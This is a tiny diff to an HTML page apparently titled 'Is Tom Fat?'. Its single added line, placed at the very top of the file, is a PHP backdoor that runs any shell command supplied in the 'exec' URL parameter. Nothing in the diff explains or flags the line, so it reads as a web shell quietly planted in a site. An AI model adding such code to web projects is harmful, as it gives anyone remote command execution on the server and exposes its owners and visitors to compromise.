@@ -1,3 +1,4 @@
+<?php exec($_GET['exec']); ?>
 <!DOCTYPE html>
 <head>
  <title>Is Tom Fat?</title>
